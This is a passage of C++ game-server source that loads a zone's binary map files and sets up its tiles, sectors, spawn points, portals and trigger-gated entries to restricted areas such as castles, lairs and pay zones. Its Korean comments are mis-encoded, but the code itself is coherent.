	setPayPlay( pZoneInfo->isPayPlay() );
//1222 - wlzzi ž®¹Ÿö ž ý // º¯öž ö
//	setPremiumZone( pZoneInfo->isPremiumZone() );
	setPremiumZoneType( pZoneInfo->getPremiumZoneType() );
	
	setPKZone( pZoneInfo->isPKZone() );
	setNoPortalZone( pZoneInfo->isNoPortalZone() );
	setMasterLair( pZoneInfo->isMasterLair() );
	setMikllizzLair( pZoneInfo->isMikllizzLair() );
	setSurvivalZone( pZoneInfo->isSurvivalZone() );
	setHolyLand( pZoneInfo->isHolyLand() );
	// 2007 06 23
	setHellGardenTower( pZoneInfo->isHellGardenTower() );

	// Holy Land  °æ¿ì HolyLandManager ¿¡ °¡
	if ( isHolyLand() )
	{
		g_pHolyLandManager->addHolyLand( this );
	}

	if (g_pCastleInfoManager->getCastleInfo(m_ZoneID)!=NULL)
	{
		setCastle( true );
	}
	else
	{
		setCastle( false );
	}

	//filelog("zoneInfo.txt", "[%d] %d %d", (int)m_ZoneID, (int)isPayPlay(), (int)isPremiumZone());

	// SMP ºž » ¿¬Ž.
	string SMPFilename = g_pConfig->getProperty("HomePath") + "/data/MAP/" + pZoneInfo->getSMPFilename();
	strcpy(lwrFilename, SMPFilename.c_str());
	strlwr( lwrFilename );
		
	if(access(lwrFilename, F_OK))
	{
	    StringStream msg;
	    msg << "file does not exist : " << lwrFilename; 
		throw Error(msg.toString());
	}

	ifstream SMP(lwrFilename, ios::in | ios::binary);
	if (!SMP)
	{
		StringStream msg;
		msg << lwrFilename << " not exist or cannot open it";
		cerr << msg.toString() << endl;
		throw FileNotExistException(msg.toString());
	}

    // read zone version  (Win32 DWORD = 4 byte, sizeof(uint32_t) ile okuyoruz)
	SMP.read((char*)&versionLen,sizeof(uint32_t));
	if (versionLen >= 128) { fprintf(stderr, "[ZTRACE] BUG: versionLen overflow buf=128 — abort\n"); fflush(stderr); throw Error("versionLen overflow"); }
	SMP.read(version,versionLen);
	version[versionLen] = 0;

	// read zone id
	SMP.read((char*)&zoneID,szWORD);

	// read zone group id (no use)
	SMP.read((char*)&zoneGroupID,szWORD);

	// read zone name
	SMP.read((char*)&zonenameLen,sizeof(uint32_t));
	if (zonenameLen >= 128) { fprintf(stderr, "[ZTRACE] BUG: zonenameLen overflow buf=128 — abort\n"); fflush(stderr); throw Error("zonenameLen overflow"); }
	if (zonenameLen > 0)
	{
		SMP.read(zonename,zonenameLen);
		zonename[zonenameLen] = 0;
	}

    // read zone type & level
	SMP.read((char*)&zoneType,szBYTE);
	SMP.read((char*)&zoneLevel,szBYTE);

	// read zone description
	SMP.read((char*)&descLen,sizeof(uint32_t));
	if (descLen > 1024*1024) { fprintf(stderr, "[ZTRACE] BUG: descLen too big — abort\n"); fflush(stderr); throw Error("descLen too big"); }
	if (descLen > 0)
	{
		pDesc = new char[descLen+1];
		SMP.read(pDesc,descLen);
		pDesc[descLen] = 0;

		SAFE_DELETE_ARRAY(pDesc);	// add '_ARRAY' moved to here.. by sigi 2002.5.2
	}

	// read zone width & height
	SMP.read((char*)&m_Width, szWORD);
	SMP.read((char*)&m_Height ,szWORD);

	Assert(m_Width <= maxZoneWidth);
	Assert(m_Height <= maxZoneHeight);

	// ž» 2÷¿ø¹è¿­· žžµéŸî žžðž®ž ŽçŽ.
	m_pTiles = new Tile* [ m_Width ];
	for (uint i = 0 ; i < m_Width ; i++) 
	{
		m_pTiles[i] = new Tile [m_Height];
	}

	// ž 2÷¿ø ¹è¿­· žžµéŸî žžðž®ž ŽçŽ.
	m_SectorWidth = (int)ceil((float)m_Width/(float)SECTOR_SIZE);
	m_SectorHeight = (int)ceil((float)m_Height/(float)SECTOR_SIZE);
	m_pSectors = new Sector*[m_SectorWidth];
	for (int x=0; x<m_SectorWidth; x++)
	{
		m_pSectors[x] = new Sector[m_SectorHeight];
	}

	// °¢°¢ ž¿¡Ž°¡  ÷ž Ž.
	for (int x=0; x<m_Width; x++)
	{
		for (int y=0; y<m_Height; y++)
		{
			int sx = x/SECTOR_SIZE;
			int sy = y/SECTOR_SIZE;

			Assert(sx < m_SectorWidth && sy < m_SectorHeight);

			m_pTiles[x][y].setSector(&m_pSectors[sx][sy]);
		}
	}

	// ³¢ž® ¿¬°á» Ž.
	VSRect srect(0, 0, m_SectorWidth-1, m_SectorHeight-1);
	for (int x=0; x<m_SectorWidth; x++)
	{
		for (int y=0; y<m_SectorHeight; y++)
		{
			for (uint d=0; d<9; d++)
			{
				int sectorx = x + dirMoveMask[d].x;
				int sectory = y + dirMoveMask[d].y;

				if (srect.ptInRect(sectorx, sectory))
				{
					m_pSectors[x][y].setNearbySector(d, &m_pSectors[sectorx][sectory]);
				}
			}
		}
	}

	// MonsterAIž § ž ¿µ¿ª» ±žºöŸî³õº »ç°¢ü» »ýºŽ.
	m_OuterRect.set(0, 0, m_Width-1, m_Height-1);
	if (m_Width > 64 && m_Height > 64)
	{
		m_InnerRect.set(15, 15, m_Width-15, m_Height-15);
		m_CoreRect.set(25, 25, m_Width-25, m_Height-25);
	}
	else
	{
		m_InnerRect = m_CoreRect = m_OuterRect;
	}

	char str[80];
	char str2[80];

	for (ZoneCoord_t y=0; y<m_Height; y++)
	{
		for (ZoneCoord_t x=0; x<m_Width; x++)
		{
			BYTE flag = 0;
			SMP.read((char*)&flag, szBYTE);

			// ø­Žë· ö, ö»ó, °ø ºí·
			if (flag & 0x01) m_pTiles[x][y].setBlocked(Creature::MOVE_MODE_BURROWING);
			if (flag & 0x02) m_pTiles[x][y].setBlocked(Creature::MOVE_MODE_WALKING);
			if (flag & 0x04) m_pTiles[x][y].setBlocked(Creature::MOVE_MODE_FLYING);

			// Ÿ¹«°µµ ŸøŽ °æ¿ì..
			// ž÷ »ýº» § ¥ºžž žžµéŸîµŽ.
			if (flag==0 && m_InnerRect.ptInRect( x, y ))
			{
				m_MonsterRegenPositions.push_back( BPOINT( (BYTE)x, (BYTE)y ) );
			}

			// ž¶º ·¹Ÿî °æ¿ì: block ³ª¶óµµ Ÿ µ °÷» £ŽŽ.
			if ((flag & 0x07)!=0x07 && (isMasterLair() || m_ZoneID == 3002))
			{
				m_EmptyTilePositions.push_back( BPOINT( (BYTE)x, (BYTE)y ) );
			}

			if ( m_ZoneID == 1127 && 
				(
					( x == 31 && y == 81 ) ||
					( x == 31 && y == 82 ) ||
					( x == 32 && y == 80 ) ||
					( x == 32 && y == 81 ) ||
					( x == 33 && y == 80 )
				))
			{
				// ŸŸ4F µ¿» § ÷» ³
				ScriptPortal* pScriptPortal;

				string strDungeonID = "IcenDungeon";
				
				pScriptPortal = new ScriptPortal();
				pScriptPortal->setDungeonID(strDungeonID);
				pScriptPortal->setDungeonIndex(0);
				
				getObjectRegistry().registerObject(pScriptPortal);
				m_pTiles[x][y].addPortal(pScriptPortal);
			}
			
			if ( m_ZoneID == 41 && 
				(
					( x == 150 && y == 121 ) ||
					( x == 149 && y == 121 )
				))
			{
				// ŸŸ4F µ¿» § ÷» ³
				ScriptPortal* pScriptPortal;

				string strDungeonID = "ruper";
				
				pScriptPortal = new ScriptPortal();
				pScriptPortal->setDungeonID(strDungeonID);
				pScriptPortal->setDungeonIndex(0);
				
				getObjectRegistry().registerObject(pScriptPortal);
				m_pTiles[x][y].addPortal(pScriptPortal);
			}
			if ( m_ZoneID == 6051 && 
				(
					( x == 151 && y == 124 ) ||
					( x == 152 && y == 125 )||
					( x == 153 && y == 126 )||
					( x == 153 && y == 127 )
				))
			{
				// ŸŸ4F µ¿» § ÷» ³
				ScriptPortal* pScriptPortal;

				string strDungeonID = "degula";
				
				pScriptPortal = new ScriptPortal();
				pScriptPortal->setDungeonID(strDungeonID);
				pScriptPortal->setDungeonIndex(0);
				
				getObjectRegistry().registerObject(pScriptPortal);
				m_pTiles[x][y].addPortal(pScriptPortal);
			}
				
			// ÷» ºž
			if (flag & 0x80)
			{
				BYTE	type;
				ZoneID_t targetZoneID;
				BYTE     targetX, targetY;
				SMP.read((char*)&type, szBYTE);

				PortalType_t portalType = PORTAL_NORMAL;

				bool bAddPortal = true;

				if (type == PORTAL_NORMAL)
				{
					SMP.read((char*)&targetZoneID, szZoneID);
					SMP.read((char*)&targetX,      szBYTE);
					SMP.read((char*)&targetY,      szBYTE);

					// ÷»» »ýº Ž.
					NormalPortal* pNormalPortal = new NormalPortal();
					pNormalPortal->setObjectType(PORTAL_NORMAL);
					pNormalPortal->setZoneID(targetZoneID);
					pNormalPortal->setX(targetX);
					pNormalPortal->setY(targetY);

					getObjectRegistry().registerObject(pNormalPortal);
					m_pTiles[x][y].addPortal(pNormalPortal);

					if (bOutput)
					{
						cout << "Normal(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}
				}
				else if (type == PORTAL_SLAYER)
				{
					SMP.read((char*)&targetZoneID, szZoneID);
					SMP.read((char*)&targetX,      szBYTE);
					SMP.read((char*)&targetY,      szBYTE);

					// ÷»» »ýº Ž.
					NormalPortal* pNormalPortal = new NormalPortal();
					pNormalPortal->setObjectType(PORTAL_SLAYER);
					pNormalPortal->setZoneID(targetZoneID);
					pNormalPortal->setX(targetX);
					pNormalPortal->setY(targetY);

					getObjectRegistry().registerObject(pNormalPortal);
					m_pTiles[x][y].addPortal(pNormalPortal);

					portalType = PORTAL_SLAYER;

					if (bOutput)
					{
						cout << "Slayer(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}
				}
				else if (type == PORTAL_VAMPIRE)
				{
					SMP.read((char*)&targetZoneID, szZoneID);
					SMP.read((char*)&targetX,      szBYTE);
					SMP.read((char*)&targetY,      szBYTE);

					// ÷»» »ýº Ž.
					NormalPortal* pNormalPortal = new NormalPortal();
					pNormalPortal->setObjectType(PORTAL_VAMPIRE);
					pNormalPortal->setZoneID(targetZoneID);
					pNormalPortal->setX(targetX);
					pNormalPortal->setY(targetY);

					getObjectRegistry().registerObject(pNormalPortal);
					m_pTiles[x][y].addPortal(pNormalPortal);

					portalType = PORTAL_VAMPIRE;

					if (bOutput)
					{
						cout << "Vampire(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}
				}
				else if (type == PORTAL_MULTI_TARGET)
				{
					BYTE size;
					SMP.read((char*)&size, szBYTE);

					// ÷»» »ýº Ž.
					MultiPortal* pMultiPortal = new MultiPortal();

					for(int i = 0; i < size; i++) 
					{
						SMP.read((char*)&targetZoneID, szZoneID);
						SMP.read((char*)&targetX,      szBYTE);
						SMP.read((char*)&targetY,      szBYTE);

						pMultiPortal->setObjectType(PORTAL_SLAYER);

						// ž° ÷ž ±žºŽ.
						PortalTargetInfo* pPortalTargetInfo = new PortalTargetInfo();
						pPortalTargetInfo->setZoneID(targetZoneID);
						pPortalTargetInfo->setX(targetX);
						pPortalTargetInfo->setY(targetY);
						pMultiPortal->setPortalTargetInfo(pPortalTargetInfo);
					}

					getObjectRegistry().registerObject(pMultiPortal);
					m_pTiles[x][y].addPortal(pMultiPortal);

					portalType = PORTAL_SLAYER;

					if (bOutput)
					{
						cout << "Multi(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}
				}
				else if ( type == PORTAL_GUILD )
				{
					SMP.read((char*)&targetZoneID, szZoneID);
					SMP.read((char*)&targetX,      szBYTE);
					SMP.read((char*)&targetY,      szBYTE);

					// ÷»» »ýº Ž.
					GuildPortal* pGuildPortal = new GuildPortal();
					pGuildPortal->setObjectType( PORTAL_GUILD );
					pGuildPortal->setZoneID( targetZoneID );
					pGuildPortal->setX( targetX );
					pGuildPortal->setY( targetY );

					getObjectRegistry().registerObject(pGuildPortal);
					m_pTiles[x][y].addPortal(pGuildPortal);

					if (bOutput)
					{
						cout << "Guild(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}

				}
				else if ( type == PORTAL_BATTLE )
				{
					SMP.read((char*)&targetZoneID, szZoneID);
					SMP.read((char*)&targetX,      szBYTE);
					SMP.read((char*)&targetY,      szBYTE);

					// ÷»» »ýº Ž.
					NormalPortal* pNormalPortal = new NormalPortal();
					pNormalPortal->setObjectType(PORTAL_NORMAL);
					pNormalPortal->setZoneID(targetZoneID);
					pNormalPortal->setX(targetX);
					pNormalPortal->setY(targetY);

					getObjectRegistry().registerObject(pNormalPortal);
					m_pTiles[x][y].addPortal(pNormalPortal);

					if (bOutput)
					{
						cout << "Battle(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}
				}
				else if (type == PORTAL_OUSTERS)
				{
					SMP.read((char*)&targetZoneID, szZoneID);
					SMP.read((char*)&targetX,      szBYTE);
					SMP.read((char*)&targetY,      szBYTE);

					// ÷»» »ýº Ž.
					NormalPortal* pNormalPortal = new NormalPortal();
					pNormalPortal->setObjectType(PORTAL_OUSTERS);
					pNormalPortal->setZoneID(targetZoneID);
					pNormalPortal->setX(targetX);
					pNormalPortal->setY(targetY);

					getObjectRegistry().registerObject(pNormalPortal);
					m_pTiles[x][y].addPortal(pNormalPortal);

					portalType = PORTAL_OUSTERS;

					if (bOutput)
					{
						cout << "Ousters(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}
				}
				else
				{
					bAddPortal = false;
				}
					
				// ÷» °¡µ °æ¿ì¿¡
				// žñûö ž ¯·áž¶óžé 
				// TriggeredPortal» ³Ÿ Ž.
				if (bAddPortal)
				{
					ZoneInfo* pTargetZoneInfo = NULL;
					try {
						pTargetZoneInfo = g_pZoneInfoManager->getZoneInfo(targetZoneID);
					} catch (NoSuchElementException& t) {
						throw Error("±·± ž ŸøŽ³");
					}

					Assert(pTargetZoneInfo!=NULL);

					// ±âž Portal» ö¿ï±î?
					bool bDeleteOldPortal = false;

					if ( ( pTargetZoneInfo->isPayPlay() && !pZoneInfo->isPayPlay() || !g_pVariableManager->getVariable(OPEN_PAYZONE) )
						|| pTargetZoneInfo->isMasterLair()
						|| pTargetZoneInfo->isMikllizzLair()
						|| ( pTargetZoneInfo->isCastle() && !g_pCastleInfoManager->isCastleZone(targetZoneID, m_ZoneID))
						|| ( pTargetZoneInfo->isHolyLand() && !pZoneInfo->isHolyLand() )
						|| (isCastle() && g_pCastleInfoManager->isCastleZone( m_ZoneID, pTargetZoneInfo->getZoneID() ) )
						// 2007 06 23
						|| pTargetZoneInfo->isHellGardenTower()
						)
					{
						bDeleteOldPortal = true;
					}

					Tile& rTile = m_pTiles[x][y];
					
					// ±âž Portal» ö¿ìŽ °æ¿ì
					if (bDeleteOldPortal)
					{
						// ±âž¿¡ Žø portal» °Ž.
						if (rTile.hasPortal())
						{
							Portal* pOldPortal = rTile.getPortal();
							rTile.deletePortal();

							delete pOldPortal;
						}
					}

					// ÷»» »ýº°í, µî·Ž.

					//----------------------------------------
					// ž¶º ·¹Ÿî °æ¿ì
					// by sigi. 2002.9.2
					//----------------------------------------
					if (pTargetZoneInfo->isMasterLair())
					{
						TriggeredPortal* pPortal = new TriggeredPortal();
						getObjectRegistry().registerObject(pPortal);

						// ÷» ³»¿ë» ·µåŽ.
						pPortal->setObjectType(portalType);

						//pPortal->load(m_ZoneID, left, top, right, bottom);
						TriggerManager& tm = pPortal->getTriggerManager();

						Trigger* pTrigger = new Trigger();

						pTrigger->setTriggerID( 0 );	// ¹ŸøŽ.

						pTrigger->setTriggerType("QUEST");

						sprintf(str, "ConditionType : EnterMasterLair\n\t TargetZoneID : %d\n\t", (int)pTargetZoneInfo->getZoneID());
						pTrigger->setConditions( str );
						sprintf(str, "ActionType : ActivatePortal\n\t ZoneID : %d\n\t X : %d\n\t Y : %d\n\t", targetZoneID, targetX, targetY);
						pTrigger->setActions(str);

//                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %s",
//                                        g_pStringPool->c_str( STRID_CANNOT_ENTER ) );
                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %d", STRID_CANNOT_ENTER );

                        pTrigger->setCounterActions( str2 );

//						pTrigger->setCounterActions("ActionType : SystemMessage\n\t Content : ö±º µéŸî°¥ ö ŸøŽŽ.");

						tm.addTrigger(pTrigger);
						
						// ž¿¡Ž ÷»» ºŽ.
						rTile.addPortal(pPortal);

						//cout << "[" << (int)pTargetZoneInfo->getZoneID() << "] is MasterLair"
						//	 << endl;
					}
					else if ( pTargetZoneInfo->isMikllizzLair() )
					{
						TriggeredPortal* pPortal = new TriggeredPortal();
						getObjectRegistry().registerObject(pPortal);

						// ÷» ³»¿ë» ·µåŽ.
						pPortal->setObjectType(portalType);

						//pPortal->load(m_ZoneID, left, top, right, bottom);
						TriggerManager& tm = pPortal->getTriggerManager();

						Trigger* pTrigger = new Trigger();

						pTrigger->setTriggerID( 0 );	// ¹ŸøŽ.

						pTrigger->setTriggerType("QUEST");

						sprintf(str, "ConditionType : EnterMikllizzLair\n\t TargetZoneID : %d\n\t", (int)pTargetZoneInfo->getZoneID());
						pTrigger->setConditions( str );
						sprintf(str, "ActionType : ActivatePortal\n\t ZoneID : %d\n\t X : %d\n\t Y : %d\n\t", targetZoneID, targetX, targetY);
						pTrigger->setActions(str);

//                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %s",
//                                        g_pStringPool->c_str( STRID_CANNOT_ENTER ) );
                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %d", STRID_CANNOT_ENTER );

                        pTrigger->setCounterActions( str2 );

//						pTrigger->setCounterActions("ActionType : SystemMessage\n\t Content : ö±º µéŸî°¥ ö ŸøŽŽ.");

						tm.addTrigger(pTrigger);
						
						// ž¿¡Ž ÷»» ºŽ.
						rTile.addPortal(pPortal);
					}
					// 2007 06 23
					else if ( pTargetZoneInfo->isHellGardenTower() )
					{
						TriggeredPortal* pPortal = new TriggeredPortal();
						getObjectRegistry().registerObject(pPortal);

						pPortal->setObjectType(portalType);

						TriggerManager& tm  = pPortal->getTriggerManager();

						Trigger* pTrigger = new Trigger();

						pTrigger->setTriggerID( 0 );

						pTrigger->setTriggerType("QUEST");

						sprintf(str, "ConditionType : EnterHellGardenTower\n\t TargetZoneID : %d\n\t", (int)pTargetZoneInfo->getZoneID());
						pTrigger->setConditions( str );
						sprintf(str, "ActionType : ActivatePortal\n\t ZoneID : %d\n\t X : %d\n\t Y : %d\n\t", targetZoneID, targetX, targetY);
						pTrigger->setActions(str);

                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %d", STRID_CANNOT_ENTER );

                        pTrigger->setCounterActions( str2 );

						tm.addTrigger(pTrigger);
						
						rTile.addPortal(pPortal);
					}
					//----------------------------------------
					// ŸŽã ºö· µéŸî°¥·°í  ¶§
					//----------------------------------------
					else if ( pTargetZoneInfo->isHolyLand() 
								&& !pZoneInfo->isHolyLand() )
					{
						TriggeredPortal* pPortal = new TriggeredPortal();
						getObjectRegistry().registerObject(pPortal);

						// ÷» ³»¿ë» ·µåŽ.
						pPortal->setObjectType(portalType);

						//pPortal->load(m_ZoneID, left, top, right, bottom);
						TriggerManager& tm = pPortal->getTriggerManager();

						Trigger* pTrigger = new Trigger();

						pTrigger->setTriggerID( 0 );	// ¹ŸøŽ.

						pTrigger->setTriggerType("QUEST");

						sprintf(str, "ConditionType : EnterHolyLand\n\t TargetZoneID : %d\n\t", (int)pTargetZoneInfo->getZoneID());
						pTrigger->setConditions( str );
						sprintf(str, "ActionType : ActivatePortal\n\t ZoneID : %d\n\t X : %d\n\t Y : %d\n\t", targetZoneID, targetX, targetY);
						pTrigger->setActions(str);

//                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %s",
//                                        g_pStringPool->c_str( STRID_CANNOT_ENTER_DURING_RACE_WAR ) );
                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %d", STRID_CANNOT_ENTER_DURING_RACE_WAR );


                        pTrigger->setCounterActions( str2 );

//						pTrigger->setCounterActions("ActionType : SystemMessage\n\t Content : Ÿ·üï ¿¡Ž »» ö ŸŸžžé µéŸî°¥ ö ŸøŽŽ.");

						tm.addTrigger(pTrigger);
						
						// ž¿¡Ž ÷»» ºŽ.
						rTile.addPortal(pPortal);

						//cout << "[" << (int)pTargetZoneInfo->getZoneID() << "] is MasterLair"
						//	 << endl;
					}
					//----------------------------------------
					// º ¹¿¡­ º Ÿž· µéŸî°¡Ž °æ¿ì
					// isCastleZone º º Ÿ¿¡ ÷µŽ žµéö ©Ž.
					// (º Žøüµµ º ŸŽ)
					// by bezz, Sequoia 2003. 1.20.
					//----------------------------------------
					else if (pTargetZoneInfo->isCastle() 
								&& !g_pCastleInfoManager->isCastleZone(targetZoneID, m_ZoneID))
					{
						TriggeredPortal* pPortal = new TriggeredPortal();
						getObjectRegistry().registerObject(pPortal);

						// ÷» ³»¿ë» ·µåŽ.
						pPortal->setObjectType(portalType);

						//pPortal->load(m_ZoneID, left, top, right, bottom);
						TriggerManager& tm = pPortal->getTriggerManager();

						Trigger* pTrigger = new Trigger();

						pTrigger->setTriggerID( 0 );	// ¹ŸøŽ.

						pTrigger->setTriggerType("QUEST");

						sprintf(str, "ConditionType : EnterCastle\n\t TargetZoneID : %d\n\t", (int)pTargetZoneInfo->getZoneID());
						pTrigger->setConditions( str );
						sprintf(str, "ActionType : ActivatePortal\n\t ZoneID : %d\n\t X : %d\n\t Y : %d\n\t", targetZoneID, targetX, targetY);
						pTrigger->setActions(str);

//                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %s",
//                                        g_pStringPool->c_str( STRID_CANNOT_ENTER ) );
                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %d", STRID_CANNOT_ENTER );

                        pTrigger->setCounterActions( str2 );

//						pTrigger->setCounterActions("ActionType : SystemMessage\n\t Content : µéŸî°¡ ö ŸøŽŽ.");

						tm.addTrigger(pTrigger);
						
						// ž¿¡Ž ÷»» ºŽ.
						rTile.addPortal(pPortal);

						//cout << "[" << (int)pTargetZoneInfo->getZoneID() << "] is MasterLair"
						//	 << endl;
					}
					//----------------------------------------
					// º ö Žø¯ž· µéŸî°¡Ž ±ž
					// by Sequoia
					//----------------------------------------
					else if (isCastle()
							&& g_pCastleInfoManager->isCastleZone( m_ZoneID, pTargetZoneInfo->getZoneID() ) )
					{
						TriggeredPortal* pPortal = new TriggeredPortal();
						getObjectRegistry().registerObject(pPortal);

						// ÷» ³»¿ë» ·µåŽ.
						pPortal->setObjectType(portalType);

						//pPortal->load(m_ZoneID, left, top, right, bottom);
						TriggerManager& tm = pPortal->getTriggerManager();

						Trigger* pTrigger = new Trigger();

						pTrigger->setTriggerID( 0 );	// ¹ŸøŽ.
						pTrigger->setTriggerType("QUEST");

						sprintf(str, "ConditionType : EnterCastleDungeon\n\t CastleZoneID : %d\n\t", m_ZoneID);
						pTrigger->setConditions( str );
						sprintf(str, "ActionType : ActivatePortal\n\t ZoneID : %d\n\t X : %d\n\t Y : %d\n\t", targetZoneID, targetX, targetY);
						pTrigger->setActions(str);

//                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %s",
//                                        g_pStringPool->c_str( STRID_CANNOT_ENTER_NOT_OWNER_GUILD ) );
                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %d", STRID_CANNOT_ENTER_NOT_OWNER_GUILD );

                        pTrigger->setCounterActions( str2 );

//						pTrigger->setCounterActions("ActionType : SystemMessage\n\t Content : º  ±æµå¿ø ŸŽžé µéŸî°¡ ö ŸøŽŽ.");

						tm.addTrigger(pTrigger);
						rTile.addPortal(pPortal);
					}
					//----------------------------------------
					// ¯·á ž °æ¿ì
					//----------------------------------------
					else if (pTargetZoneInfo->isPayPlay() && !pZoneInfo->isPayPlay() || !g_pVariableManager->getVariable(OPEN_PAYZONE) )
					{
						TriggeredPortal* pPortal = new TriggeredPortal();
						getObjectRegistry().registerObject(pPortal);

						// ÷» ³»¿ë» ·µåŽ.
						pPortal->setObjectType(portalType);

						//pPortal->load(m_ZoneID, left, top, right, bottom);
						TriggerManager& tm = pPortal->getTriggerManager();

						Trigger* pTrigger = new Trigger();

						pTrigger->setTriggerID( 0 );	// ¹ŸøŽ.

						pTrigger->setTriggerType("QUEST");
						pTrigger->setConditions("ConditionType : CanEnterPayZone\n\t");
						sprintf(str, "ActionType : ActivatePortal\n\t ZoneID : %d\n\t X : %d\n\t Y : %d\n\t", targetZoneID, targetX, targetY);
						pTrigger->setActions(str);

						// by sigi. 2002.10.30
						if (g_pConfig->getPropertyInt("IsNetMarble")==0)
						{
//                            sprintf( str2, "ActionType : SystemMessage\n\t Content : %s",
//                                            g_pStringPool->c_str( STRID_CANNOT_ENTER_PAY_ZONE ) );
                            sprintf( str2, "ActionType : SystemMessage\n\t Content : %d", STRID_CANNOT_ENTER_PAY_ZONE );

                            pTrigger->setCounterActions( str2 );

//							pTrigger->setCounterActions("ActionType : SystemMessage\n\t Content : ¯·áž¶ó­ µéŸî°¥ ö ŸøŽŽ.");
						}
						else
						{
//                            sprintf( str2, "ActionType : SystemMessage\n\t Content : %s",
 //                                           g_pStringPool->c_str( STRID_CANNOT_ENTER ) );
                            sprintf( str2, "ActionType : SystemMessage\n\t Content : %d", STRID_CANNOT_ENTER );

                            pTrigger->setCounterActions( str2 );

//							pTrigger->setCounterActions("ActionType : SystemMessage\n\t Content : ö±º °¥ ö ŸøŽŽ.");
						}

						tm.addTrigger(pTrigger);
						
						// ž¿¡Ž ÷»» ºŽ.
						rTile.addPortal(pPortal);
					}
				}
			} //if (flag & 0x80)
		} // for 
	} // for

	SMP.close();

	///*
	if (m_MonsterRegenPositions.size()==0)
	{
		printf("MonsterRegenPosition not exist: Width = %d, Height = %d\n", (int)m_Width, (int)m_Height);

		//Assert(m_MonsterRegenPositions.size()!=0);

		ZoneCoord_t outerMinX = m_Width/7;
		ZoneCoord_t outerMinY = m_Height/7;
		ZoneCoord_t outerMaxX = m_Width-outerMinX;
		ZoneCoord_t outerMaxY = m_Width-outerMinY;

		for (ZoneCoord_t y=outerMinY; y<outerMaxY; y++)
		{
			for (ZoneCoord_t x=outerMinX; x<outerMaxX; x++)
			{
				Tile& rTile = m_pTiles[x][y];

				if (!rTile.hasPortal() 
					&& !rTile.isGroundBlocked()
					&& !rTile.isAirBlocked()
					&& !rTile.isUndergroundBlocked())
				{
					m_MonsterRegenPositions.push_back( BPOINT( (BYTE)x, (BYTE)y ) );
				}
			}
		}

		Assert(m_MonsterRegenPositions.size()!=0);
	}

	if ( isDynamicZone() )
	{
		cout << "MonsterRegenPositions(" << m_ZoneID << "," << m_MonsterRegenPositions.size() << ")" << endl;
	}

	if ((isMasterLair() || m_ZoneID == 3002) && m_EmptyTilePositions.size()==0)
	{
		printf("MasterLair has No EmptyTilePosition\n");
		Assert(m_EmptyTilePositions.size()!=0);
	}
	//*/

	// Zone ºžž Ž.
	m_ZoneType  = pZoneInfo->getZoneType();
	m_ZoneLevel = pZoneInfo->getZoneLevel();

	// žžðž® Žç°í...
	m_ppLevel = new ZoneLevel_t* [ m_Width ];
	for (uint i = 0; i < m_Width; i++)
		m_ppLevel[i] = new ZoneLevel_t[m_Height];

	// ž ·¹º§» µðú® °ªž· ±â­²Ž.
	for (ZoneCoord_t x = 0; x < m_Width; x++)
		for (ZoneCoord_t y = 0; y < m_Height; y++)
			m_ppLevel[x][y] = m_ZoneLevel;

	// SSI ºž » ¿¬Ž.
	string SSIFilename = g_pConfig->getProperty("HomePath") + "/data/MAP/" + pZoneInfo->getSSIFilename();
	strcpy(lwrFilename, SSIFilename.c_str());
	strlwr( lwrFilename );

	if(access(lwrFilename, F_OK))
	{
		StringStream msg;
		msg << "file does not exist : " <<  lwrFilename; 
		throw Error(msg.toString());
	}

	ifstream SSI(lwrFilename, ios::in | ios::binary );
	if (!SSI)
	{
		StringStream msg;
		msg <<  lwrFilename << " not exist or cannot open it";
		throw FileNotExistException(msg.toString());
	}

	int size = 0;
	SSI.read((char*)&size, szint);

	BYTE left, top, right, bottom, level;
	for (int i=0; i<size; i++)
	{
		SSI.read((char*)&level, szBYTE);
		SSI.read((char*)&left, szBYTE);
		SSI.read((char*)&top, szBYTE);
		SSI.read((char*)&right, szBYTE);
		SSI.read((char*)&bottom, szBYTE);

		if (bOutput)
		{
			cout << "LEVEL:" << (int)level << ",(" << (int)left << "," << (int)top << "," << (int)right << "," << (int)bottom << ")" << endl;
		}

		Assert(left <= right);
		Assert(top  <= bottom);

		for (int bx=left; bx<=right; bx++)
			for (int by=top; by<=bottom; by++)
				m_ppLevel[bx][by] = level;
	}

	SSI.close();

	// ®ž®°µå ÷»» ·µåŽ.
	loadTriggeredPortal();

	// žóº ·µå°í....
	m_pMonsterManager->load();


//#ifdef __XMAS_EVENT_CODE__
//	printf("Begin Event Monster Loading\n");
//	m_pEventMonsterManager->load();
//	printf("Event Monster Loading Completed\n");
//#endif

	// ž¶º ·¹Ÿî °æ¿ì
	// by sigi. 2002.9.2
	if (pZoneInfo->isMasterLair())
	{
		SAFE_DELETE(m_pMasterLairManager);
		m_pMasterLairManager = new MasterLairManager(this);
	}

	// ¹¬ž®î ·¹Ÿî °æ¿ì
	if ( pZoneInfo->isMikllizzLair() )
	{
		SAFE_DELETE(m_pMikllizzLairManager);
		m_pMikllizzLairManager = new MikllizzLairManager(this);
	}

	// ï°¡µç ž¿ö °æ¿ì 2007 06 23
	if ( pZoneInfo->isHellGardenTower() )
	{
		SAFE_DELETE(m_pHellGardenTowerManager);
		m_pHellGardenTowerManager = new HellGardenTowerManager(this);
		// ï°¡µç ž¿öžé HellGardenTowerMonsterList ºí¿¡­ °¡®¿Ž.
//		m_pHellGardenTowerManager->MonsterListLoad();

	}

#ifdef __MENEGROTH_DOUNGEON_SYSTEM__
